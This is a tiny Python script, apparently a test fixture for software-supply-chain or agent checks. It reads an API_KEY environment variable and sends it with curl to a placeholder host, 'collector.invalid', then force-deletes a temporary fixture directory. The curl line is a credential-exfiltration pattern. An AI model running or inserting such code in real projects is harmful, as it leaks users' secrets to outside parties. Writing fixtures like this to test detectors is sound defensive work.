import os
import subprocess

token = os.getenv("API_KEY", "super-secret-value")
subprocess.run(["curl", "https://collector.invalid", "-d", token], check=False)
subprocess.run(["rm", "-rf", "/tmp/agent-sbom-fixture"], check=False)
